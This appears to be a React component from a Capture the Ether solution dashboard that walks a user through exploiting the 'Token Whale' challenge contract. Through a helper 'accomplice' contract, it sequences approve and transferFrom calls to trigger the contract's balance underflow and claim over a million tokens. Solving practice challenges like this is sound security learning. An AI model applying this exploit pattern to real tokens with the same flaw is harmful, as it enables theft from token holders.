import React from 'react';
import { getTransactionReceipt } from '../utilities/getTransactionReceipt';
import { getNetworkContract } from '../utilities/networkUtilities';
import loadInstance from '../utilities/loadInstance';
import CaptureRow from "./CaptureRow";

const tokenWhaleChallengeAbi = require('../abi/TokenWhaleChallenge.json').abi;
const tokenWhaleHelperAbi = require('../abi/TokenWhaleHelper.json').abi;
const waitingText = "Waiting...";

const tokenWhaleState = {
	setAliceAllowance: 1,
	waitingAliceAllowance: 2,
	setAccompliceBalance: 3,
	waitingAccompliceBalance: 4,
	setAccompliceAllowance: 5,
	waitingAccompliceAllowance: 6,
	setAliceBalance: 7,
	waitingAliceBalance: 8,
    completed: 9
};

export default function TokenWhale (props) {
    const [tokenWhaleChallengeInstance, setTokenWhaleChallengeInstance] = React.useState();
    const [tokenWhaleHelperInstance, setTokenWhaleHelperInstance] = React.useState();
    const [isComplete, setIsComplete] = React.useState();
    const [balance, setBalance] = React.useState(0);
    const [accompliceBalance, setAccompliceBalance] = React.useState(0);
    const [requestState, setRequestState] = React.useState(tokenWhaleState.completed);

    if (props.web3 && props.accounts && props.networkType) {
        if (!tokenWhaleChallengeInstance)
            loadInstance(tokenWhaleChallengeAbi, getNetworkContract(props.networkType, "TokenWhaleChallengeContract"), setTokenWhaleChallengeInstance, props.accounts, props.web3);
        if (!tokenWhaleHelperInstance)
            loadInstance(tokenWhaleHelperAbi, getNetworkContract(props.networkType, "TokenWhaleHelperContract"), setTokenWhaleHelperInstance, props.accounts, props.web3);
    }

    const performAliceAllowance = () => {
        setRequestState(tokenWhaleState.waitingAliceAllowance);
        tokenWhaleChallengeInstance.methods.approve(tokenWhaleHelperInstance._address, 1000000000000)
            .send( { from: props.accounts[0] }, function (error, txBuy) {
            if (error)
                alert(`Failed: ${error.message}`);
            else {
                getTransactionReceipt(txBuy, props.web3);
                setRequestState(tokenWhaleState.setAccompliceBalance);
            }
        });
    }

    const performAccompliceBalance = () => {
        setRequestState(tokenWhaleState.waitingAccompliceBalance);
        tokenWhaleHelperInstance.methods.transferFrom(props.accounts[0], props.accounts[0], 1)
            .send( { from: props.accounts[0] }, function (error, txBuy) {
            if (error)
                alert(`Failed: ${error.message}`);
            else {
                getTransactionReceipt(txBuy, props.web3);
                setRequestState(tokenWhaleState.setAccompliceAllowance);
            }
        });
    }

    const performAccompliceAllowance = () => {
        setRequestState(tokenWhaleState.waitingAccompliceAllowance);
        tokenWhaleHelperInstance.methods.approve(tokenWhaleHelperInstance._address, 9999999999)
            .send( { from: props.accounts[0] }, function (error, txBuy) {
            if (error)
                alert(`Failed: ${error.message}`);
            else {
                getTransactionReceipt(txBuy, props.web3);
                setRequestState(tokenWhaleState.setAliceBalance);
            }
        });
    }

    const performAliceBalance = () => {
        setRequestState(tokenWhaleState.waitingAliceBalance);
        tokenWhaleHelperInstance.methods.transferFrom(tokenWhaleHelperInstance._address, props.accounts[0], 9999999999)
            .send( { from: props.accounts[0] }, function (error, txBuy) {
            if (error)
                alert(`Failed: ${error.message}`);
            else {
                getTransactionReceipt(txBuy, props.web3);
                setRequestState(tokenWhaleState.completed);
                checkCompleted();
            }
        });
    }

    const getRequestState = async () => {
        var aliceBalance = await tokenWhaleChallengeInstance.methods.balanceOf(props.accounts[0]).call();
        if (parseFloat(aliceBalance) > 1000000) {
            setRequestState(tokenWhaleState.completed);
            return tokenWhaleState.completed;
        }
        var accompliceAllowance = await tokenWhaleChallengeInstance.methods.allowance(tokenWhaleHelperInstance._address, props.accounts[0]).call();
        if (parseFloat(accompliceAllowance) > 0) {
            setRequestState(tokenWhaleState.setAliceBalance);
            return tokenWhaleState.setAliceBalance;
        }
        var accompliceBalance = await tokenWhaleChallengeInstance.methods.balanceOf(tokenWhaleHelperInstance._address).call();
        if (parseFloat(accompliceBalance) > 0) {
            setRequestState(tokenWhaleState.setAccompliceAllowance);
            return tokenWhaleState.setAccompliceAllowance;
        }
        var aliceAllowance = await tokenWhaleChallengeInstance.methods.allowance(props.accounts[0], tokenWhaleHelperInstance._address).call();
        if (parseFloat(aliceAllowance) > 0) {
            setRequestState(tokenWhaleState.setAccompliceBalance);
            return tokenWhaleState.setAccompliceBalance;
        }
        setRequestState(tokenWhaleState.setAliceAllowance);
        return tokenWhaleState.setAliceAllowance;
    }

    const OnClickTokenWhale = (event) => {
        event.preventDefault();
        if (!isComplete) {
            if (requestState === tokenWhaleState.completed) {
                getRequestState();
            }
            else {
                performNextStep();
            }
        }
        else
            alert(`already completed`);
    }

    const getButtonState = () => {
        const buttonText = getButtonText();
        return tokenWhaleChallengeInstance && tokenWhaleHelperInstance && buttonText !== waitingText;
    }

    const getButton = () => {
        const buttonText = getButtonText();
        return (<button disabled={!getButtonState()} onClick={OnClickTokenWhale}>{buttonText}</button>);
    }

    const checkCompleted = () => {
        if (props.web3 && props.accounts && tokenWhaleChallengeInstance && tokenWhaleHelperInstance) {
            console.log(`tokenWhale.checkCompleted`);
            tokenWhaleChallengeInstance.methods.isComplete().call().then(completed => setIsComplete(completed), 
                err => alert(`tokenWhale.isComplete: ${err}`));
            tokenWhaleChallengeInstance.methods.balanceOf(tokenWhaleHelperInstance._address).call().then(balance => {
                setAccompliceBalance(balance);
            },
                err => alert(`tokenHelper.getBalance: ${err}`));
            tokenWhaleChallengeInstance.methods.balanceOf(props.accounts[0]).call().then(balance => {
                setBalance(balance);
            },
                err => alert(`tokenWhale.getBalance: ${err}`));
        }
    }

    const getCompleted = () => {
        if (!tokenWhaleChallengeInstance) {
            return "loading";
        }
        checkCompleted();
        return isComplete ? "true" : "false";
    }

    const getButtonText = () => {
        switch (requestState) {
            case tokenWhaleState.setAliceAllowance:
                return "Set my allowance";
            case tokenWhaleState.setAccompliceBalance:
                return "Set accomplice balance";
            case tokenWhaleState.setAccompliceAllowance:
                return "Set accomplice allowance";
            case tokenWhaleState.setAliceBalance:
                return "Transfer to me";
            case tokenWhaleState.waitingAliceAllowance:
            case tokenWhaleState.waitingAccompliceBalance:
            case tokenWhaleState.waitingAccompliceAllowance:
            case tokenWhaleState.waitingAliceBalance:
                return waitingText;
            default:
                break;
        }
        return "Token whale";
    }

    const requestStateView = () => {
        switch (requestState) {
            case tokenWhaleState.setAliceAllowance:
            case tokenWhaleState.setAccompliceBalance:
            case tokenWhaleState.setAccompliceAllowance:
            case tokenWhaleState.setAliceBalance:
                return "<-- Click button on left";
            case tokenWhaleState.waitingAliceAllowance:
                return "Waiting for my allowance";
            case tokenWhaleState.waitingAccompliceBalance:
                return "Waiting for accomplice balance";
            case tokenWhaleState.waitingAccompliceAllowance:
                return "Waiting for accomplice allowance";
            case tokenWhaleState.waitingAliceBalance:
                return "Waiting for transfer to me";
            default:
                break;
        }
        return "";
    }

    const performNextStep = () => {
        switch (requestState) {
            case tokenWhaleState.setAliceAllowance:
                performAliceAllowance();
                break;
            case tokenWhaleState.setAccompliceBalance:
                performAccompliceBalance();
                break;
            case tokenWhaleState.setAccompliceAllowance:
                performAccompliceAllowance();
                break;
            case tokenWhaleState.setAliceBalance:
                performAliceBalance();
                break;
            default:
                break;
        }
    }

    const getBalanceText = () => {
        const text = accompliceBalance.length > 10 ? ">1,000,000" : accompliceBalance;
        return `${balance}/${text}`;
    }

    return (<CaptureRow name="Token whale" blocks={requestStateView()} action={getButton()} balance={getBalanceText()} completed={getCompleted()} />);
}
